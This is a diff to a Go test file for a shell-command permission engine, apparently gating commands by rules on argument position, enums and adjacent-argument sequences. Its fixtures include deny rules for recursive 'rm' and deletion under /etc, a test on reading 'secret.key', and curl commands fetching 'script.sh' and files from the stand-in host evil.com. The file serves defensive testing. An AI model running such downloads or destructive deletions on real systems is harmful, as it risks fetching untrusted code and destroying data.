@@ -22,6 +22,23 @@ func parseAndEval(t *testing.T, cfg *Config, input string) Result {
 	return eval.Evaluate(info)
 }
 
+// Helper functions to convert old-style patterns to new types for tests
+func stringsToMatchElements(patterns []string) []MatchElement {
+	result := make([]MatchElement, len(patterns))
+	for i, p := range patterns {
+		result[i] = MatchElement{Pattern: p}
+	}
+	return result
+}
+
+func stringsToFlexiblePatternMap(m map[string]string) map[string]FlexiblePattern {
+	result := make(map[string]FlexiblePattern)
+	for k, v := range m {
+		result[k] = FlexiblePattern{Patterns: []string{v}}
+	}
+	return result
+}
+
 func TestEvalAllowList(t *testing.T) {
 	cfg := &Config{
 		Policy: PolicyConfig{
@@ -167,7 +184,7 @@ func TestEvalArgMatching(t *testing.T) {
 				Command: "rm",
 				Action:  "deny",
 				Message: "No recursive rm",
-				Args:    ArgsMatch{AnyMatch: []string{"-r", "-rf", "--recursive"}},
+				Args:    ArgsMatch{AnyMatch: stringsToMatchElements([]string{"-r", "-rf", "--recursive"})},
 			},
 		},
 	}
@@ -707,12 +724,12 @@ func TestCalculateSpecificity(t *testing.T) {
 		},
 		{
 			name:     "command + args.position",
-			rule:     Rule{Command: "rm", Action: "deny", Args: ArgsMatch{Position: map[string]string{"0": "/"}}},
+			rule:     Rule{Command: "rm", Action: "deny", Args: ArgsMatch{Position: stringsToFlexiblePatternMap(map[string]string{"0": "/"})}},
 			expected: 120, // 100 + 20
 		},
 		{
 			name:     "command + args.any_match",
-			rule:     Rule{Command: "rm", Action: "deny", Args: ArgsMatch{AnyMatch: []string{"-r", "-rf"}}},
+			rule:     Rule{Command: "rm", Action: "deny", Args: ArgsMatch{AnyMatch: stringsToMatchElements([]string{"-r", "-rf"})}},
 			expected: 110, // 100 + 5 + 5
 		},
 		{
@@ -737,7 +754,7 @@ func TestCalculateSpecificity(t *testing.T) {
 				Action:  "deny",
 				Args: ArgsMatch{
 					Contains: []string{"-rf"},
-					Position: map[string]string{"0": "/"},
+					Position: stringsToFlexiblePatternMap(map[string]string{"0": "/"}),
 				},
 				Pipe: PipeContext{To: []string{"xargs"}},
 			},
@@ -1109,7 +1126,7 @@ func TestPathPatternInRules(t *testing.T) {
 				Command: "rm",
 				Action:  "allow",
 				Args: ArgsMatch{
-					AnyMatch: []string{"path:$HOME/**"},
+					AnyMatch: stringsToMatchElements([]string{"path:$HOME/**"}),
 				},
 			},
 			{
@@ -1117,7 +1134,7 @@ func TestPathPatternInRules(t *testing.T) {
 				Action:  "deny",
 				Message: "Cannot delete outside home",
 				Args: ArgsMatch{
-					AnyMatch: []string{"path:/etc/**"},
+					AnyMatch: stringsToMatchElements([]string{"path:/etc/**"}),
 				},
 			},
 		},
@@ -1149,10 +1166,10 @@ func TestPathPatternPosition(t *testing.T) {
 				Command: "rm",
 				Action:  "allow",
 				Args: ArgsMatch{
-					Position: map[string]string{
+					Position: stringsToFlexiblePatternMap(map[string]string{
 						"0": "-rf",
 						"1": "path:$HOME/**",
-					},
+					}),
 				},
 			},
 		},
@@ -1602,10 +1619,10 @@ func TestFileRulePositionalPatterns(t *testing.T) {
 				Command: "cp",
 				Action:  "allow",
 				Args: ArgsMatch{
-					Position: map[string]string{
+					Position: stringsToFlexiblePatternMap(map[string]string{
 						"0": "rule:read",  // source is checked with Read rules
 						"1": "rule:write", // dest is checked with Write rules
-					},
+					}),
 				},
 			},
 		},
@@ -1852,5 +1869,256 @@ func TestRespectFileRulesDisabled(t *testing.T) {
 
 	if result.Action != "allow" {
 		t.Errorf("cat secret.key with respect_file_rules=false should be allowed, got %s", result.Action)
+	}
+}
+
+// ============================================================================
+// Extended Argument Matching Tests
+// ============================================================================
+
+func TestPositionEnumValues(t *testing.T) {
+	// Test position with array values (enum matching, OR semantics)
+	cfg := &Config{
+		Policy: PolicyConfig{
+			Default:         "ask",
+			DynamicCommands: "ask",
+		},
+		Rules: []Rule{
+			{
+				Command: "git",
+				Action:  "allow",
+				Args: ArgsMatch{
+					Position: map[string]FlexiblePattern{
+						"0": {Patterns: []string{"status", "diff", "log", "branch"}},
+					},
+				},
+			},
+			{
+				Command: "git",
+				Action:  "deny",
+				Message: "Network operations denied",
+				Args: ArgsMatch{
+					Position: map[string]FlexiblePattern{
+						"0": {Patterns: []string{"push", "pull", "fetch", "clone"}},
+					},
+				},
+			},
+		},
+	}
+
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"git status", "allow"},
+		{"git diff HEAD~1", "allow"},
+		{"git log --oneline", "allow"},
+		{"git branch -a", "allow"},
+		{"git push origin main", "deny"},
+		{"git pull --rebase", "deny"},
+		{"git clone https://github.com/user/repo", "deny"},
+		{"git add .", "ask"}, // not in either enum
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.input, func(t *testing.T) {
+			r := parseAndEval(t, cfg, tc.input)
+			if r.Action != tc.expected {
+				t.Errorf("%q: expected %s, got %s (source: %s)", tc.input, tc.expected, r.Action, r.Source)
+			}
+		})
+	}
+}
+
+func TestAnyMatchSequence(t *testing.T) {
+	// Test any_match with sequence objects (adjacent arg matching)
+	cfg := &Config{
+		Policy: PolicyConfig{
+			Default:         "ask",
+			DynamicCommands: "ask",
+		},
+		Rules: []Rule{
+			{
+				Command: "ffmpeg",
+				Action:  "allow",
+				Args: ArgsMatch{
+					AnyMatch: []MatchElement{
+						// Match "-i <home-path>" anywhere in args
+						{
+							IsSequence: true,
+							Sequence: map[string]FlexiblePattern{
+								"0": {Patterns: []string{"-i"}},
+								"1": {Patterns: []string{"path:$HOME/**"}},
+							},
+						},
+						// Also allow string patterns
+						{Pattern: "re:^--help$"},
+					},
+				},
+			},
+		},
+	}
+
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"ffmpeg -i ~/video.mp4 -o ~/out.mp4", "allow"}, // -i followed by $HOME path
+		{"ffmpeg --help", "allow"},                      // string pattern match
+		{"ffmpeg -i /etc/video.mp4 -o ~/out.mp4", "ask"}, // -i not followed by $HOME path
+		{"ffmpeg -o ~/out.mp4", "ask"},                  // no -i flag
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.input, func(t *testing.T) {
+			r := parseAndEval(t, cfg, tc.input)
+			if r.Action != tc.expected {
+				t.Errorf("%q: expected %s, got %s (source: %s)", tc.input, tc.expected, r.Action, r.Source)
+			}
+		})
+	}
+}
+
+func TestAllMatchSequence(t *testing.T) {
+	// Test all_match with sequence objects (multiple required pairs)
+	cfg := &Config{
+		Policy: PolicyConfig{
+			Default:         "ask",
+			DynamicCommands: "ask",
+		},
+		Rules: []Rule{
+			{
+				Command: "openssl",
+				Action:  "allow",
+				Args: ArgsMatch{
+					AllMatch: []MatchElement{
+						// Require both "-in <file>" and "-out <file>" pairs
+						{
+							IsSequence: true,
+							Sequence: map[string]FlexiblePattern{
+								"0": {Patterns: []string{"-in"}},
+								"1": {Patterns: []string{"glob:*.pem"}},
+							},
+						},
+						{
+							IsSequence: true,
+							Sequence: map[string]FlexiblePattern{
+								"0": {Patterns: []string{"-out"}},
+								"1": {Patterns: []string{"glob:*.der", "glob:*.pem"}}, // enum in sequence
+							},
+						},
+					},
+				},
+			},
+		},
+	}
+
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"openssl x509 -in cert.pem -out cert.der", "allow"}, // both pairs present
+		{"openssl x509 -in cert.pem -out cert.pem", "allow"}, // .pem also allowed for out
+		{"openssl x509 -in cert.pem", "ask"},                 // missing -out pair
+		{"openssl x509 -out cert.der", "ask"},                // missing -in pair
+		{"openssl x509 -in cert.txt -out cert.der", "ask"},   // -in value not .pem
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.input, func(t *testing.T) {
+			r := parseAndEval(t, cfg, tc.input)
+			if r.Action != tc.expected {
+				t.Errorf("%q: expected %s, got %s (source: %s)", tc.input, tc.expected, r.Action, r.Source)
+			}
+		})
+	}
+}
+
+func TestMixedAnyMatchStringAndSequence(t *testing.T) {
+	// Test mixing string patterns and sequence objects in any_match
+	cfg := &Config{
+		Policy: PolicyConfig{
+			Default:         "ask",
+			DynamicCommands: "ask",
+		},
+		Rules: []Rule{
+			{
+				Command: "curl",
+				Action:  "allow",
+				Args: ArgsMatch{
+					AnyMatch: []MatchElement{
+						{Pattern: "re:^--output=/tmp/"},    // string: --output=/tmp/...
+						{Pattern: "re:^-o$"},               // string: -o flag
+						{Pattern: "re:^https://example\\.com"}, // string: example.com URL
+					},
+				},
+			},
+		},
+	}
+
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"curl --output=/tmp/file.txt https://evil.com", "allow"},
+		{"curl -o /tmp/file https://evil.com", "allow"},
+		{"curl https://example.com/api", "allow"},
+		{"curl https://evil.com/script.sh", "ask"},
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.input, func(t *testing.T) {
+			r := parseAndEval(t, cfg, tc.input)
+			if r.Action != tc.expected {
+				t.Errorf("%q: expected %s, got %s (source: %s)", tc.input, tc.expected, r.Action, r.Source)
+			}
+		})
+	}
+}
+
+func TestSequenceSlidingWindow(t *testing.T) {
+	// Test that sequence matching uses sliding window correctly
+	cfg := &Config{
+		Policy: PolicyConfig{
+			Default:         "ask",
+			DynamicCommands: "ask",
+		},
+		Rules: []Rule{
+			{
+				Command: "myapp",
+				Action:  "allow",
+				Args: ArgsMatch{
+					AnyMatch: []MatchElement{
+						{
+							IsSequence: true,
+							Sequence: map[string]FlexiblePattern{
+								"0": {Patterns: []string{"--config"}},
+								"1": {Patterns: []string{"default"}},
+							},
+						},
+					},
+				},
+			},
+		},
+	}
+
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"myapp --config default", "allow"},            // at start
+		{"myapp --verbose --config default", "allow"},  // in middle
+		{"myapp --verbose --config default --quiet", "allow"}, // surrounded
+		{"myapp --config custom", "ask"},               // value doesn't match
+		{"myapp default --config", "ask"},              // wrong order
+	}
+
+	for _, tc := range tests {
+		t.Run(tc.input, func(t *testing.T) {
+			r := parseAndEval(t, cfg, tc.input)
+			if r.Action != tc.expected {
+				t.Errorf("%q: expected %s, got %s (source: %s)", tc.input, tc.expected, r.Action, r.Source)
+			}
+		})
 	}
 }
